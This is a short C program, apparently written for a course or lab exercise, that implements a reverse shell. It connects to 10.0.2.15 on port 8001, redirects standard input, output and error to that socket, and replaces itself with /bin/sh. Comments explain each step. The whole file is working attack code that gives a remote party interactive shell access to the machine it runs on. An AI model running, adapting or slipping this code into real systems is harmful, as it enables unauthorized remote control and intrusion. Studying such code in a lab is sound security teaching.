#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/time.h>
#include <strings.h>
#include <string.h>

void exit_with_error(const char* msg) {
	if (msg == NULL)  
		perror("The following error occurred");
	else 
		perror(msg);

	exit(EXIT_FAILURE);
}

int main() {
	int socket_id;				// socket descriptor
	struct sockaddr_in cli_sockaddr;	// socket address for client
	short port_num = 8001;			// port # for the server application
	const char* server_ip = "10.0.2.15";

	
	/*
	 * 1. create a socket, which will be used to wait for an incoming connection from a client
	 */
	printf("creating a socket.\n");
	if ((socket_id = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
		exit_with_error(NULL);


	/*
	 * 2. connect to the server
	 */
	printf("connecting to the server.\n");
	cli_sockaddr.sin_family = AF_INET;
	cli_sockaddr.sin_port = htons(port_num);
	cli_sockaddr.sin_addr.s_addr = inet_addr(server_ip);
	if (connect(socket_id, (struct sockaddr *) &cli_sockaddr, sizeof(cli_sockaddr)) == -1)
		exit_with_error(NULL);
	printf("now you are connected.\n");
	
	/*
 	 * 3. redirect stdin, stdout, stderr to the client socket
 	 *    and replace the current process with a command shell
 	 *    as a result,
 	 *    (i) data that arrive from the socket (i.e., command from remote
 	 *    shell) will be sent to the shell 
 	 *    (ii) data that need to be written to stdout & stderr will be
 	 *    sent to the socket
 	 */
	printf("redirect stdin, stdout, and stderr to client socket.\n");
	printf("& replace current process with a command shell.\n");

	if (dup2(socket_id, 0) < 0) exit_with_error(NULL);
	if (dup2(socket_id, 1) < 0) exit_with_error(NULL);
	if (dup2(socket_id, 2) < 0) exit_with_error(NULL);

	if (execl("/bin/sh", "sh", (char*) NULL) < 0) exit_with_error(NULL);
		
	
	return 0;	
}
